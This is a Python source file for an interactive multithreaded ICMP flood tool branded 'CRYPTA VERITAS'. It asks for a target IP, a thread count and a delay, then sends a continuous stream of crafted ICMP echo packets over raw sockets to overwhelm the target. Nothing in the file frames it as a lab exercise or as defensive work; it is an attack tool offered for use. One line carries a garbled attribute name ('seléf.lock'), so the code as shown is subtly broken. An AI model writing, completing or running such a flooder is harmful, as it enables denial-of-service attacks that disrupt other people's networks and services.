import socket
import random
import threading
import struct
import sys
import time
from ipaddress import ip_address

class ICMPFlooder:
    def __init__(self):
        self.target = None
        self.threads = 10
        self.delay = 0.001
        self.packet_count = 0
        self.running = False
        seléf.lock = threading.Lock()

    def checksum(self, data):
        if len(data) % 2:
            data += b'\0'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def create_icmp_package(self):
        icmp_id = random.randint(0, 65535)
        icmp_seq = random.randint(0, 65535)
        payload = bytes(random.randint(32, 126) for _ in range(56))

        header = struct.pack('!BBHHH', 8, 0, 0, icmp_id, icmp_seq)
        checksum = self.checksum(header + payload)
        header = struct.pack('!BBHHH', 8, 0, checksum, icmp_id, icmp_seq)

        return header + payload
    
    def flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(2)

            while self.running:
                try:
                    packet = self.create_icmp_package()
                    sock.sendto(packet, (self.target, 0))

                    with self.lock:
                            self.packet_count += 1

                    if self.delay > 0:
                        time.sleep(self.delay)
                except Exception:
                    continue

        except PermissionError:
            print("\n [-] Error: Raw sockets require root/admin privileges")
            self.running = False
        except Exception as e:
            print(f"\n [-] Error: {e}")
            self.running = False

    def stats(self):
        while self.running:
            time.sleep(1)
            with self.lock:
                count = self.packet_count
            print(f"\r[+] packets sent: {count} | Target: {self.target}", end='', flush=True)
    
    def get_input(self):
        print("=" * 50)
        print("        ICMP FLOODER - CRYPTA VERITAS")
        print("=" * 50)

        while True:
            self.target = input("\n[?] Enter target Ip: ").strip()
            try:
                ip_address(self.target)
                break
            except ValueError:
                print("[-] Invalid Ip Address")

        while True:
            try:
                threads_input = input("[?] Number of threads [default: 10]: ").strip()
                if threads_input == "":
                    self.threads = 10
                else:
                    self.threads = int(threads_input)
                    if self.threads < 1:
                        print("[-] Threads must be at least 1")
                        continue
                break
            except ValueError:
                print("[-] Please enter a valid number")

        while True:
            try:
                delay_input = input("[?] Delay between packets in seconds [default: 0.001]: ").strip()
                if delay_input == "":
                    self.delay = 0.001
                else:
                    self.delay = float(delay_input)
                    if self.delay < 0:
                        print("[-] Delay cannot be negative")
                        continue
                break
            except ValueError:
                print("[-] Please enter a valid number")

        print("\n" + "=" * 50)
        print(f"Target:  {self.target}")
        print(f"Threads: {self.threads}")
        print(f"Delay:   {self.delay}s")
        print("=" * 50)
        
        confirm = input("\n[?] Start flooding? [Y/n]: ").strip().lower()
        return confirm in ('y', 'yes', '')

    def start(self):
        if not self.get_input():
            print("[*] Cancelled.")
            return
        
        print(f"\n[*] Starting ICMP flood...")
        print(f"[*] Press Ctrl+C to stop\n")
        
        self.running = True
        
        # Start worker threads
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n[*] Total packets sent: {self.packet_count}")
            print("[*] Stopping...")